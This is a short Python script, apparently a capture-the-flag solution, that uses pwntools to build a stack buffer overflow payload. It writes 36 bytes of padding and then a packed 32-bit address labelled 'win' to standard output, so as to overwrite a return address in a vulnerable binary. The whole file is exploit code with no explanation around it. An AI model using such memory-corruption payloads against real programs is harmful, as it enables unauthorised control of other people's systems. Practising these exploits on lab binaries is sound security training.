import sys
from pwn import *
payload = b"A" * 36
win = p32(0xB875820)
payload += win
sys.stdout.buffer.write(payload)
